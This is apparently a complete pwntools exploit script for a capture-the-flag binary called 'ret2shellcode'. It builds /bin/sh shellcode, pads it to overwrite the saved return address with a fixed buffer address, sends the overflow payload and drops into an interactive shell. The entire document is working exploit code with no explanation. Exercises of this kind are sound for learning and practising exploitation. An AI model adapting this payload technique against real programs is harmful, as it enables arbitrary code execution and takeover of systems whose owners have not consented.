#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2shellcode')
elf = ELF('./ret2shellcode')

buf1_addr = 0x601040
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x78, b'A') + p64(buf1_addr)

p.recvuntil("Please pwn me :)\n")
p.sendline(payload)
p.interactive()
